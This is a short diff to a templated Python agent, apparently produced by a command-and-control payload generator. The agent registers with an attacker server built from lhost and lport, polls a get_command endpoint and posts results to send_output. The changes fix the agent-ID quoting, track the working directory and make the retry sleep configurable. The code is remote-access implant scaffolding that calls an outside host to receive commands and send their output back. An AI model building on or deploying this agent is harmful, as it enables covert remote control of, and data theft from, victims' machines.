@@ -368,10 +368,13 @@ headers = {{
 }}
 
 SERVER_URL = 'https://{lhost}:{lport}'
-AGENT_ID = ={agent_id}
+AGENT_ID = '{agent_id}'
 REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
 COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
 OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'
+
+global current_working_directory
+current_working_directory = os.getcwd()
 
 {val1}
 
@@ -471,13 +474,13 @@ def register_agent():
                 break  # Break the loop if registration is successful
             else:
                 print("Failed to register agent. Retrying...")
-                time.sleep(random.randint(5, 10))  # Random sleep between retries
+                time.sleep({sleepTimer})  # Random sleep between retries
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
-            time.sleep(random.randint(5, 10))
+            time.sleep({sleepTimer})
         except requests.exceptions.RequestException as e:
             print(f"Network error: {{e}}")
-            time.sleep(random.randint(5, 10))
+            time.sleep({sleepTimer})
 
 def main():
     {val2}    
